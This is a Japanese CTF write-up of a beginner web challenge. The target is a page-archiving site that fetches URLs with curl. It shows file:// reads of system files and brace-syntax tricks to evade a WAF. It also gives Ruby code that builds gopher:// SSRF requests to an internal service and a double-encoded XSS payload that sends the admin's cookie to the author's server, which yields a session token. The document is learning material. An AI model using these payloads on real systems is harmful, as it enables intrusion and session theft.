# CTF for Beginners NEXT 2017
## はじめに
このwriteupはCTF for Begginers nextでのweb問題のものです。

## 解き方
### 1. サイトの概要を調べる
* 所謂魚拓サイト。
* サイトのURLを送信するとサイト一覧に追加され、そのサイト一覧をクリックすると、サーバ側そこにアクセスしてレスポンスを表示する。

### 2. どこに脆弱性があるかの目安をつける
#### ページ書かれていることを読むと…
> Posted gyotakus are checked by admin
  * **XSSの問題 ?**
#### 適当に`hoge`と送信して、そのページに移動すると…
> curl: (6) Could not resolve host: hoge
  * **内部でcurlが使われている…だと！？**
    * curlをうまく使って、攻撃？
#### `<script>`とかを送信すると…
> Forbidden
  * **WAFが使われている？？**
    * パターンをうまく外してあげれば？？

### 3. curlを悪用して、ファイルを読み取る
#### curlのおぞましい機能
##### 多量のプロトコルに対応
  * fileが使える…？
    * file://etc/passwd
    * file://etc/apache2/apaches.conf

##### `{}`を使った機能
  * http://{A,B}.com
    => http://A.com http://B.com
  * http://{A}.com
    => http://A.com
    * WAFのパターンから外せる…？

##### 実際に送信してみると…
```file:///etc/{apache2}/apache2.conf```

```
ProxyPass / http://127.0.0.1:9999/
ProxyPassReverse / http://127.0.0.1:9999/
```

`127.0.0.1:8000`に直接投げ込めばOK ?

### 4. curlでオプションを使わずにPOSTを投げる
* **gopher**を使ってtcpでhttp postを書いてけばいける？
* [いい感じに%コーディングしてくれるスクリプト](https://gist.github.com/nicklegr/b55035f9c7aaef4788c3fe3b308cadb4) が便利！
  * nicklegr様ありがとうございます。

#### とりあえずHTTP GETを投げてみる
送信してみてWAFに引っかかった部分は、`{}`で囲みました。
##### コード
```
def encode(str)
  str
    .gsub(" ", "%20")
    .gsub("\n", "%0d%0a")
end

cmd = "curl gopher://localhost:9999/_" + encode(<<-EOD)
GET / HTTP/1.{1}
{Host}: localhost:9999
EOD

puts cmd
```
##### 送信した文字列
```
gopher://localhost:9999/_GET%20/%20HTTP/1.{1}%0d%0a{Host}:%20glocalhost:9999%0d%0a
```

#### 次はPOSTでサイトを追加する
##### コード
```
def encode(str)
  str
    .gsub(" ", "%20")
    .gsub("\n", "%0d%0a")
end

cmd = "curl gopher://localhost:9999/_" + encode(<<-EOD)
GET /new HTTP/1.{1}
{Host}: localhost:9999
{Content-Length}: 5
{Content-Type}: application/x-www-form-urlencoded
{Cookie}: session=自分のセッション

url=http://example.com
EOD

puts cmd
```

##### 送信した文字列
```
gopher://localhost:9999/_POST%20/new%20HTTP/1.{1}%0d%0a{Host}:%20localhost:9999%0d%0a{Content-Length}:%2022%0d%0a{Content-Type}:%20application/x-www-form-urlencoded%0d%0a{Cookie}:%20session=自分のセッション%0d%0a%0d%0aurl=http://example.com
```

### 5. XSSを投げるぞい
自分のサーバをたてて、そのサーバに対して管理者のクッキーを投げるように仕向ける。

#### その前に問題点
##### <script>に気づかれてしまった
もう一度コーディングする  
`<script>` => `%3C script %3E` => `%253C script %253E`

##### document.cookieもだめ
`document.cookie` => `document%252ecookie`

#### コード
```
def encode(str)
  str
    .gsub(" ", "%20")
    .gsub("\n", "%0d%0a")
end

cmd = "curl gopher://localhost:9999/_" + encode(<<-EOD)
POST /new HTTP/1.{1}
{Host}: localhost:9999
{Content-Length}: リクエストボディの文字数
{Content-Type}: application/x-www-form-urlencoded
{Cookie}: session=自分のクッキー

url=%253cscript>location.href="自分のサイトのURL/%3fa="%252bdocument%252ecookie%253c/script>
EOD

puts cmd
```
#### 送信した文字列
```
gopher://localhost:9999/_POST%20/new%20HTTP/1.{1}%0d%0a{Host}:%20localhost:9999%0d%0a{Content-Length}:%2094%0d%0a{Content-Type}:%20application/x-www-form-urlencoded%0d%0a{Cookie}:%20session=自分のクッキー%0d%0a%0d%0aurl=%253cscript>location.href="自分のサイトのURL/%3fa="%252bdocument%252ecookie%253c/script>
```

#### 結果
管理者のセッションがゲットできた！！
> session=293e53ca013fb6ece2ef7d773905495e503bf3ba38781363a504b21f0a3248e3

### 7. 管理者としてアクセス
Develover Tools -> Application -> Cookies のセッションを管理者のセッションにして再読込み！
そうするとフラグが見える！

> FLAG{cURL__is__GOD}
